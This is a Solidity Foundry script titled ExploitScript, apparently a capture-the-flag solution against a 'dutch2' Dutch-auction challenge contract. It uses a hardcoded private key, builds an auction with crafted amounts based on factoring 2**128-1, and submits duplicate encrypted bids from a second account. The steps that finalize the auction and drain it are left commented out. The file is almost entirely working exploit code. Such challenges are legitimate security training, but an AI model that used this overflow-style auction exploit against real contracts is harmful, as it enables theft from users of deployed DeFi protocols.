// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {Token} from "../../src/dutch2/Token.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {AuctionManager} from "../../src/dutch2/AuctionManager.sol";
import {Challenge} from "../../src/dutch2/Challenge.sol";
import {Math} from "../../src/dutch2/util/Math.sol";

contract ExploitScript is Script {
    address player;
    address player2;
    uint256 playerPrivateKey;
    uint256 player2PrivateKey;
    ERC20 quoteToken;
    ERC20 baseToken;
    AuctionManager auction;
    Challenge challenge;

    function setUp() public {
        challenge = Challenge(
            address(0x46389B936c3d394F42A348C7C367F9e009c26Dd1)
        );
        playerPrivateKey = 0x20cb8798fa82769e11266c42d93f6b66a37d7231d78101c4a8c114e8101ada34;
        player = vm.addr(playerPrivateKey);
        player2PrivateKey = 0x4567;
        player2 = vm.addr(player2PrivateKey);
        auction = challenge.auction();
        baseToken = challenge.baseToken();
        quoteToken = challenge.quoteToken();
    }

    function run() public {
        vm.startBroadcast(playerPrivateKey);
        baseToken.approve(address(auction), type(uint256).max);
        uint256 privateKey = 0x1;
        Math.Point memory publicKey = Math.publicKey(privateKey);
        // factorization of 2**128-1 = totalBase * totalQuote
        uint128 amountBase = 92826887214783219843; // around 92e18
        uint128 amountQuote = 3665773755114633685; // around 3.66e18
        AuctionManager.AuctionParameters memory params = AuctionManager
            .AuctionParameters({
                tokenBase: address(baseToken),
                tokenQuote: address(quoteToken),
                minBid: 1 ether,
                totalBase: amountBase,
                resQuoteBase: 1 * uint256(type(uint128).max),
                merkle: bytes32(0),
                publicKey: publicKey
            });
        uint32 ts = 1710666680;
        AuctionManager.Time memory time = AuctionManager.Time({
            start: ts - 100,
            end: ts + 120,
            startVesting: ts + 120,
            endVesting: ts + 120,
            cliff: 0
        });
        uint256 aid = auction.create(params, time);
        quoteToken.transfer(address(player2), 10 ether);
        payable(player2).transfer(1 ether);
        vm.stopBroadcast();

        vm.startBroadcast(player2PrivateKey);
        quoteToken.approve(address(auction), 10 ether);
        uint256 privateKey2 = 0x2;
        Math.Point memory publicKey2 = Math.publicKey(privateKey2);
        // convert (2**128 * 1) to bytes32, represents buying only 1 (wei) base token
        bytes32 message = hex"0000000000000000000000000000000100000000000000000000000000000000";
        bytes32 commit = auction.genCommitment(message);
        (, bytes32 encryptedBid) = Math.encrypt(
            publicKey,
            privateKey2,
            message
        );
        auction.addBid(
            aid,
            amountQuote,
            commit,
            publicKey2,
            encryptedBid,
            new bytes32[](0)
        );
        auction.addBid(
            aid,
            amountQuote,
            commit,
            publicKey2,
            encryptedBid,
            new bytes32[](0)
        );
        vm.stopBroadcast();

        // vm.startBroadcast(playerPrivateKey);
        // auction.show(aid, 0x1, new bytes(0));
        // uint256[] memory indices = new uint256[](2);
        // indices[0] = 0;
        // indices[1] = 1;
        // auction.finalize(aid, indices, amountBase, type(uint128).max);
        // console.log("Player base token balance:", baseToken.balanceOf(player));
        // console.log(
        //     "Auction base token balance:",
        //     baseToken.balanceOf(address(auction))
        // );
        // baseToken.transfer(address(auction), baseToken.balanceOf(player));
        // quoteToken.transfer(address(auction), 7331547510229267370 - 1e10);
        // auction.finalize(aid, indices, amountBase, type(uint128).max);
        // vm.stopBroadcast();
    }
}
